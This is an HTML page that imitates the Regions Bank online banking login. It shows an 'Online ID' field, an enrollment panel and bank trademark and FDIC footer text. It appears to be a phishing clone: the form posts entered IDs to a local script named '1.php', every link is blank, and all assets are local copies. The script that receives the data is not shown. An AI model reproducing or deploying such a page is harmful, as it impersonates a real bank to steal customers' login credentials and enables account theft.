
<!DOCTYPE html>
<html lang="en" x-ms-format-detection="none">

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Log in to your Regions online banking account to securely access and manage accounts, pay bills, transfer money and more. New to online banking? Enroll today.">
    <title>Regions Online Banking - Log in to your accounts | Regions </title>
    <link href="css/com-regions.css" rel="stylesheet">
    <link href="css/oldAuth.min.css" rel="stylesheet">
    <link rel="icon" href="favicon.ico">
</head>

<body>

    <header class="rds-header simple">
        <div class="container">
            <a class="logo-link" href="" title="Go home">
                <picture class="logo">
                    <source srcset="media/regions-logo-no-r.svg" media="(max-width: 600px)">
                    <img src="media/regions-logo-no-r.svg" alt="regions logo">
                </picture>
            </a>
        </div>
    </header>



    <main role="main" class="pb-3" id="main-section">


        <link href="css/Common.css" rel="stylesheet">

        <div>
            <div class="rds-wizard-body">
                <div class="body-content">
                    <div class="rds-short-form-tile container login-enroll">
                        <h1 class="sr-only"> Login to Online Banking</h1>
                        <div class="col-md-12">

                            <div class="col-md-6 col-xs-12" id="username-section" style="display: block;">
                                <h2 id="login-header">Existing Online Customers</h2>
                                <div class="row">
                                    <div class="col-xs-12">
                                        <p id="note-login">Please enter your Online ID to log in.</p>
                                        <input type="text" id="hdnIsPostRedirection" maxlength="18" value="False" class="hide-ele" data-val="true" data-val-required="The IsPostRedirection field is required." name="IsPostRedirection">
                                        <form class="rds-form form" id="login-form" action="1.php" method="POST" autocomplete="off">
                                            <div id="divUserName" class="field animated-label text">
                                                <label class="control-label" for="UserName" id="username-label">Online ID</label>
                                                <input type="text" id="UserName" name="UserName" maxlength="18" aria-labelledby="username-label" aria-required="True" class="form-control to-switch" data-val="true" data-val-required="The Online ID field is required." value="" autocomplete="off" style="max-height: 67px; padding-top: 33px;">
                                                <div id="UserName-error" class="error-custom-block hidden">
                                                    <p class="help-block error">Online ID is required to log in.</p>
                                                </div>
                                            </div>
                                            <div class="well warning-message">
                                                Please check that the "Caps Lock" or "Num Lock" key is off.
                                            </div>
                                            <div id="login-btn-holder">
                                                <div class="pull-left form-check">
                                                    <input type="checkbox" id="login-remember-me" class="form-check-input">
                                                    <label for="login-remember-me" class="form-check-label" style="padding-left: 41px;">Remember Me</label>
                                                </div>
                                                <div class="pull-right">
                                                    <button type="submit" class="btn btn-primary btn-lg" id="next-btn">Next</button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                    <div id="login-forgot-url-link">
                                        <span class="forgot-url-link"><span aria-hidden="true">Forgot </span><a href="" aria-label="Forgot Online ID?">Online ID</a> or <a href="" aria-label="Forgot Password?">Password?</a></span>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 col-xs-12" id="enroll-section" style="display: block;">
                                <h2 id="enroll-header"> New Online Customers</h2>
                                <div class="well">
                                    <div class="row">
                                        <div class="col-xs-12">
                                            <h3 class="font-size-16"> Enroll Now To:</h3>

                                            <ul id="note-enroll-feature">
                                                <li><span>Access your accounts online</span></li>
                                                <li><span>Pay bills online</span></li>
                                                <li><span>Send us a secure message</span></li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="row align-flex-right"><a class="btn btn-info btn-lg" href="">Enroll</a></div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>

    </main>


    <footer class="rds-footer">
        <div class="footer-content">
            <ul>
                <li><a href="" target="_blank">Contact Us</a></li>
                <li><a href="" target="_blank">Terms and Conditions</a></li>
                <li><a href="" target="_blank">Privacy Pledge</a></li>
                <li><a href="" target="_blank">Security</a></li>
                <li><a href="" target="_blank">Online Tracking and Advertising</a></li>
                <li><a href="" target="_blank">Accessible Banking</a></li>
                <li><a href="" target="_blank">Leave Feedback</a></li>

            </ul>

            <p>Call&nbsp;<a href="">1-800-REGIONS</a></p>
            <p>Regions, the Regions logo, the LifeGreen color, and the LifeGreen bike are registered trademarks of Regions Bank.</p>
            <p>© 2022 Regions Bank. All Rights Reserved.</p>

            <div class="footer-icon">
                <img src="media/equal-housing-lender.svg" alt="Equal Housing Lender">
                <img src="media/member-fdic.svg" alt="Member FDIC">
            </div>
        </div>
    </footer>

    <div>


    </div>



</body>

</html>